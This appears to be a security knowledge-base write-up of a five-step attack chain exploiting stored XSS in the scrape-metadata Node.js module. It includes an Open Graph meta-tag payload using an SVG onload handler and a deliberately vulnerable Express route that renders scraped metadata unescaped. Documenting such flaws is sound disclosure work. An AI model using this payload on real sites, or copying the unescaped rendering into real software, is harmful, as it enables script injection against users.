---
tags:
  - xss
  - stored-xss
  - nodejs
  - open-graph
  - metadata-scraping
type: attack_chain
tools:
  - '[[tools/npm]]'
  - '[[tools/node]]'
  - '[[tools/express]]'
tactics:
  - '[[Execution]]'
verified: false
platforms:
  - Web
  - Node.js
submitted: true
complexity: medium
created_at: '2024-10-01T00:00:00Z'
procedures:
  - '[[procedures/Create-and-Host-Malicious-HTML-Payload]]'
  - '[[procedures/Install-scrape-metadata-Module]]'
  - '[[procedures/Develop-Vulnerable-Express-Application]]'
  - '[[procedures/Run-the-Vulnerable-Node-js-Application]]'
  - '[[procedures/Trigger-XSS-via-Browser-Access]]'
step_count: 5
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:16:02.721Z'
description: >-
  Multi-stage attack exploiting a stored XSS vulnerability in the
  scrape-metadata Node.js module by injecting JavaScript into Open Graph meta
  tags, scraping the malicious content, and rendering it unsafely in an Express
  web application to execute arbitrary JavaScript in the browser.
skill_level: intermediate
impact_level: high
id: 7f172109-9337-4f8c-bb98-0bf7eed5d656
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Stored XSS in scrape-metadata via Malicious Open Graph Metadata

Multi-stage attack chain demonstrating a complete attack workflow exploiting unsanitized metadata extraction in the scrape-metadata Node.js module, leading to stored XSS execution in a web browser.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 5 |
| Execution Time | ~10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Malicious HTML] --> B[Install Module]
    B --> C[Develop App]
    C --> D[Run Server]
    D --> E[Trigger in Browser]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#9b59b6
    style E fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/npm]]
- [[tools/node]]
- [[tools/express]]

### Target Environment

- Node.js runtime (version 8.9.3 or compatible)
- npm (version 5.5.1 or compatible)
- Local web server access for hosting HTML (e.g., http://pokegen.in)
- Browser for accessing the endpoint
- Required services/ports: Port 8080 open locally
- Network access requirements: Internet access to host and scrape URL

### Initial Access Requirements

- No credentials required
- Local machine with Node.js installed
- Ability to host a simple HTML file publicly

## Detailed Attack Procedures

### Step 1: Create Malicious HTML Payload
procedure: [[procedures/Create-and-Host-Malicious-HTML-Payload]]

**Objective**: Craft and host an HTML file containing JavaScript injected into the Open Graph title meta tag to serve as the payload for the XSS vulnerability.

**Instructions**: Create an HTML file with the malicious meta tag. The payload uses an SVG onload attribute to execute JavaScript. Save it as test.html and upload to a hosting server.

Example HTML content:

```html
<!DOCTYPE html>
<html>
<head>
<meta property="og:title" content='https://google.com<svg/onload=prompt(1)>'>
</head>
<body>
</body>
</html>
```

Host it at a URL like http://pokegen.in/test.html.

**Expected Output**: Malicious HTML file accessible via the hosted URL, with the og:title containing the injectable payload.

**Success Indicators**:
- HTML file created and verifiable via direct browser access to the URL
- Meta tag inspectable in page source, showing the injected SVG onload

### Step 2: Install scrape-metadata Module
procedure: [[procedures/Install-scrape-metadata-Module]]

**Objective**: Set up the vulnerable module in the local Node.js environment to enable metadata scraping.

**Instructions**: Use npm to install the scrape-metadata package, which will be used in the subsequent application to extract unsanitized metadata.

Execute [[commands/npm-install-scrape-metadata]]:

```bash
npm install scrape-metadata
```

**Expected Output**: Package installed in node_modules, with confirmation logs in the terminal.

**Success Indicators**:
- scrape-metadata directory appears in node_modules
- No installation errors

### Step 3: Develop Vulnerable Express Application
procedure: [[procedures/Develop-Vulnerable-Express-Application]]

**Objective**: Build a Node.js Express app that scrapes the malicious URL and renders the metadata directly in HTML without escaping, setting up the XSS vector.

**Instructions**: Create a file named scrap.js. Require the scrape-metadata and express modules. Set up a route at /scrap that fetches metadata from the malicious URL and renders it using JSON.stringify in an HTML template.

Example code for scrap.js:

```javascript
const express = require('express');
const scrape = require('scrape-metadata');
const app = express();

app.get('/scrap', async (req, res) => {
  const meta = await scrape('http://pokegen.in/test.html');
  console.log(meta);
  res.send(`<p>site title: ${JSON.stringify(meta)}</p>`);
});

app.listen(8080, () => {
  console.log('Server running on port 8080');
});
```

This code logs the metadata and sends an unsanitized HTML response including the og:title.

**Expected Output**: scrap.js file created, ready for execution, with the app configured to scrape and render on port 8080.

**Success Indicators**:
- Code file saved without syntax errors
- Dependencies (express, scrape-metadata) resolvable

### Step 4: Run the Vulnerable Node.js Application
procedure: [[procedures/Run-the-Vulnerable-Node-js-Application]]

**Objective**: Start the Express server to listen for requests and perform the scraping when the endpoint is accessed.

**Instructions**: Execute the scrap.js script using Node.js to launch the server.

Execute [[commands/node-run-scrap-js]]:

```bash
node scrap.js
```

**Expected Output**: Terminal output showing "Server running on port 8080" and the server ready to handle requests.

**Success Indicators**:
- Server starts without errors
- Port 8080 is listening (verifiable with netstat or similar)

### Step 5: Trigger XSS via Browser Access
procedure: [[procedures/Trigger-XSS-via-Browser-Access]]

**Objective**: Access the application's endpoint in a browser to scrape the malicious metadata and execute the injected JavaScript payload.

**Instructions**: Open a web browser and navigate to the local endpoint. The app will scrape the URL, render the metadata, and the browser will execute the onload=prompt(1) payload.

Visit: http://127.0.0.1:8080/scrap

**Expected Output**: Browser displays the page with a JavaScript prompt dialog popping up, confirming XSS execution.

**Success Indicators**:
- JavaScript alert/prompt appears
- Console logs show the scraped metadata including the malicious og:title

## Attack Chain Summary

### Key Achievements

1. Successful injection of JavaScript into Open Graph metadata
2. Unsanitized scraping and rendering leading to XSS execution
3. Demonstration of potential impacts like session cookie theft

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[JavaScript]]

### MITRE ATT&CK Tactics

- [[Execution]]

---
*Last updated: 2024-10-01T00:00:00Z*
